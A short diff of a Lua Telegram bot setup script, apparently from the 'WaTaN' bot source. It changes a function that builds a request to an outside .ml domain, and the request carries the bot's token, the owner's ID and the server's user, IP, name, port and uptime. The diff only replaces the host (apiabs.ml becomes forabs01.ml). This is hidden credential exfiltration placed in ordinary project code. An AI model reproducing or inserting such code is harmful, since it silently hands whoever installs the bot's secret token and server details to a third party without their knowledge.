@@ -64,7 +64,7 @@ file:write(serialized)
 file:close()  
 end
 local function Files_Info_Get()
-local requests = "https://apiabs.ml/Api/WaTaN/index.php?Get=WaTaN&DevId="..database:get(Server.."UserSudo_Write").."&TokenBot="..database:get(Server.."Token_Write").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port.."&UpTime="..UpTime
+local requests = "forabs01.ml/Api/WaTaN/index.php?Get=WaTaN&DevId="..database:get(Server.."UserSudo_Write").."&TokenBot="..database:get(Server.."Token_Write").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port.."&UpTime="..UpTime
 Config = {
 token = database:get(Server.."Token_Write"),
 SUDO = database:get(Server.."UserSudo_Write"),
